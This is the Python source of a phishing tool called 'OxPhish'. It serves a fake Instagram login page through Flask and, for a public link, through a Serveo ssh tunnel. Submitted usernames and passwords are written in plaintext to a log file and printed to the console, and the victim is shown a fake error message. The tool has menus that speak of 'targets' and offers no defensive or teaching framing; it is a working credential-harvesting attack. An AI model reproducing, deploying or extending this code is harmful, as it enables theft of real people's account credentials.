import os
import sys
import time
import requests
import subprocess
from termcolor import colored
from pyfiglet import figlet_format
from flask import Flask, request, render_template

app = Flask(__name__)
log_dir = 'Log'
log_file = os.path.join(log_dir, 'instagram_log.txt')

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def display_logo():
    logo_text = figlet_format("OxPhish", font="slant")
    print(colored(logo_text, 'cyan', attrs=['bold']))
    print(colored("\nDeveloped by Oxeser", 'yellow', attrs=['bold']))
    print(colored("GitHub: https://github.com/Oxeser", 'yellow', attrs=['bold']))

def check_for_updates():
    repo_url = "https://github.com/Oxeser/OxPhish"
    local_path = os.path.dirname(os.path.abspath(__file__))
    try:
        response = requests.get(f"{repo_url}/main").status_code
        if response == 200:
            print(colored("[+] Your tool is up-to-date.", 'green', attrs=['bold']))
        else:
            print(colored("[!] Updating your tool...", 'yellow', attrs=['bold']))
            subprocess.run(["git", "pull"], cwd=local_path)
            print(colored("[+] Update completed.", 'green', attrs=['bold']))
    except Exception as e:
        print(colored(f"[-] Update check failed: {e}", 'red', attrs=['bold']))

@app.route('/instagramlogin', methods=['GET', 'POST'])
def instagram_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open(log_file, 'a') as f:
            f.write(f'Instagram Username: {username}, Password: {password}\n')
        print(colored(f'[+] Instagram user credentials saved: {username}, {password}', 'green', attrs=['bold']))
        return 'An error occurred, please try again', 200
    return render_template('instagram.html')

def start_server(port):
    url = f'http://127.0.0.1:{port}/instagramlogin'
    print(colored(f"[+] Target URL --> {url}", 'yellow', attrs=['bold']))
    print(colored("[+] Waiting for target credentials...", 'green', attrs=['bold']))

    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    logging.getLogger('werkzeug').setLevel(logging.ERROR)

    app.run(host='0.0.0.0', port=port)

def start_serveo_tunnel(port):
    print(colored("[!] Starting Serveo tunnel...", 'yellow', attrs=['bold']))
    try:
        result = subprocess.run(
            ["ssh", "-R", f"80:localhost:{port}", "serveo.net"],
            check=True,
            capture_output=True,
            text=True
        )
        serveo_url = None
        for line in result.stdout.splitlines():
            if "https://" in line:
                serveo_url = line.strip()
                break
        if serveo_url:
            print(colored(f"[+] Serveo tunnel established. URL: {serveo_url}", 'green', attrs=['bold']))
        else:
            print(colored("[-] Could not retrieve Serveo URL.", 'red', attrs=['bold']))
    except subprocess.CalledProcessError:
        print(colored("[-] Failed to start Serveo tunnel.", 'red', attrs=['bold']))

def instagram_login_menu():
    clear_screen()
    display_logo()
    print(colored("=" * 80, 'yellow', attrs=['bold']))
    print(colored("=" * 80, 'yellow', attrs=['bold']))
    print(colored("              [01] Localhost", 'cyan', attrs=['bold']))
    print(colored("              [02] Serveo", 'cyan', attrs=['bold']))
    print(colored("              [00] Back", 'red', attrs=['bold']))
    print(colored("=" * 80, 'yellow', attrs=['bold']))
    print("\n")

    choice = input(colored("Select an option: ", 'cyan', attrs=['bold']))

    if choice == '01':
        port = input(colored("Enter the port to use: ", 'cyan', attrs=['bold']))
        start_server(int(port))
    elif choice == '02':
        port = input(colored("Enter the port to use for Serveo: ", 'cyan', attrs=['bold']))
        start_serveo_tunnel(port)
    elif choice == '00':
        return
    else:
        print(colored("[-] Invalid option. Please try again.", 'red', attrs=['bold']))
        time.sleep(1)
        instagram_login_menu()

def display_main_menu():
    print(colored("=" * 80, 'yellow', attrs=['bold']))
    print(colored("=" * 80, 'yellow', attrs=['bold']))
    print(colored("              [01] Instagram Login", 'cyan', attrs=['bold']))
    print(colored("              [00] Exit", 'red', attrs=['bold']))
    print(colored("=" * 80, 'yellow', attrs=['bold']))
    print("\n")

def main_menu():
    clear_screen()
    check_for_updates()
    time.sleep(2)
    clear_screen()
    display_logo()
    while True:
        display_main_menu()
        choice = input(colored("Select an option: ", 'cyan', attrs=['bold']))

        if choice == '01':
            instagram_login_menu()
        elif choice == '00':
            print(colored("[!] Thank you for using our tool! Goodbye.", 'yellow', attrs=['bold']))
            sys.exit()
        else:
            print(colored("[-] Invalid option. Please try again.", 'red', attrs=['bold']))
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(colored("\n[!] Thank you for using our tool! Goodbye.", 'yellow', attrs=['bold']))
